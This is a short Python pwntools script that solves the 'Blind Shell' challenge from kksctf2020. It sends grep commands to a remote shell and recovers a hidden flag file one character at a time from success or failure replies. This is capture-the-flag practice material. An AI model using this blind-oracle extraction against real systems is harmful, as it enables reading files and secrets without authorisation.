"""
 @ Date
 : 2020.12.21
 
 @ Description
 : kksctf2020's Blind Shell 
 
 : read "maybehere/flag.txt"
 : flag gueessing

"""

from pwn import *

alphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:;<=>?@[]^'

conn = remote('tasks.kksctf.ru', 30010)
conn.sendline("cat maybehere/flag.txt | grep kks{")
conn.recvline()

flag = "kks{"


while True:
	for i in alphabet:
		test = flag + i
		conn.sendline("cat maybehere/flag.txt |grep " + test)
		r = conn.recvline().decode()
		if r[2] == "F":
			print("[Failed]", test )
			continue

		if r[2] == "S":
			flag = test
			print("[Success]",flag)
			break	

	if flag[-1] == "}":
		break


print("Here's your content", flag)